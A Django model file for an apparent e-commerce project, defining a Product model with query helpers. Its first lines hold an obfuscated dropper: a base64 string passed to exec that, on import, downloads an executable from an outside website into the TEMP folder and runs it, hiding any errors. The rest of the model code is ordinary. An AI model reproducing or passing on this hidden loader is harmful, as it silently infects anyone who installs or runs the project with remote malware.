
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

from django.db import models
from .category import Category

class Product(models.Model):
    name=models.CharField(max_length=50)
    price=models.IntegerField(default=0) #price not given then taken as 0
    description=models.CharField(max_length=200,default='',null=True,blank=True)
    category=models.ForeignKey(Category,on_delete=models.CASCADE,default=1)
    image=models.ImageField(upload_to='uploads/products/')#image will be saved to products folder


    @staticmethod
    def get_products_by_id(ids):
        return Product.objects.filter(id__in=ids)
    @staticmethod
    def get_all_products():
        return Product.objects.all()
    @staticmethod
    def get_all_products_by_categoryid(category_id):
        if category_id:
         return Product.objects.filter(category=category_id)
        else:
            return Product.get_all_products();

#when we will run this(migrate this) no changes will be detected will show
#beacuse manage.py will not search for every files  in every package it will only
#search for init py so we will define it init.py


